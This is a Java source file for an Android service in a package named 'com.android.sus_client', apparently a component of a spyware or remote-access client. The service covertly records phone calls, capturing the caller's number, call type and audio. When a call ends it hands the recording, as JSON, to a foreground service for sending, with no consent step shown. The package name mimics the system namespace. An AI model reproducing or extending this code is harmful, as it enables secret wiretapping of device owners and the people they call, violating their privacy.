package com.android.sus_client.background.calls;

import static com.android.sus_client.utils.Constants.COMMAND_TYPE_CALL;
import static com.android.sus_client.utils.Constants.PHONE_NUMBER;
import static com.android.sus_client.utils.Constants.STATE_CALL_END;
import static com.android.sus_client.utils.Constants.STATE_CALL_START;
import static com.android.sus_client.utils.Constants.STATE_INCOMING_NUMBER;
import static com.android.sus_client.utils.Constants.TYPE_CALL;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;

import com.android.sus_client.annotation.Nullable;
import com.android.sus_client.services.ForegroundService;
import com.android.sus_client.utils.Actions;

import org.json.JSONObject;

public class ActionService extends Service {

    private String mAction = "";


    /**
     * Used for call recording
     */
    private String phoneNumber;
    private int callType = 0;
    private CallsInteractor interactor;


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        this.interactor = new CallsInteractor(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null || interactor.isRecording()) {
            return super.onStartCommand(intent, flags, startId);
        }

        mAction = (intent.getAction() == null ? "" : intent.getAction());
        switch (mAction) {
            case Actions.RECORD_CALL:
                initCallRecording(intent);
                break;
            default:
                break;
        }
        return super.onStartCommand(intent, flags, startId);
    }

    private void initCallRecording(Intent intent) {
        int commandType = intent.getIntExtra(COMMAND_TYPE_CALL, 0);
        switch (commandType) {
            case STATE_INCOMING_NUMBER:
                if (phoneNumber == null) {
                    phoneNumber = intent.getStringExtra(PHONE_NUMBER);
                    callType = intent.getIntExtra(TYPE_CALL, 0);
                }
                break;
            case STATE_CALL_START:
                if (phoneNumber != null)
                    interactor.startRecording(phoneNumber, callType);
                break;
            case STATE_CALL_END:
                phoneNumber = null;
                interactor.stopRecording(var1 -> {
                    // send recorded file
                    CallRecordingModel recording = var1.args;
                    invokeForegroundBroadcast(CallRecordingModel.toJSON(recording));
                    return null;
                });
                break;
            default:
                break;
        }
    }

    private void invokeForegroundBroadcast(JSONObject data) {
        sendBroadcast(ForegroundService.getBroadcastIntent(mAction, data));
        stopServiceDelay();
    }

    private void stopServiceDelay() {
        new Handler().postDelayed(this::stopSelf, 1000);
    }

    public static void stop(Context context) {
        try {
            context.stopService(new Intent(context, ActionService.class));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Intent getActionIntent(Context context, String action) {
        Intent intent = new Intent(context, ActionService.class);
        intent.setAction(action);
        return intent;
    }

}